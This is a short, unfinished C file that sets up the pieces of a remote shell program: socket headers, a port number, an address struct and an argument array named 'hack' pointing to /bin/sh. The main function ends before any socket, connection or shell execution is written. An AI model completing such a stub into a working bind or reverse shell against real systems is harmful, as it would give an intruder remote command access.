#include <sys/socket.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>

#include <stdio.h>

int main()
{
int clientfd,sockfd;
int dstport = 12345;

char *hack[2];
hack[0] = "/bin/sh";
hack[1] = 0;

struct sockaddr_in mysockaddr;

}
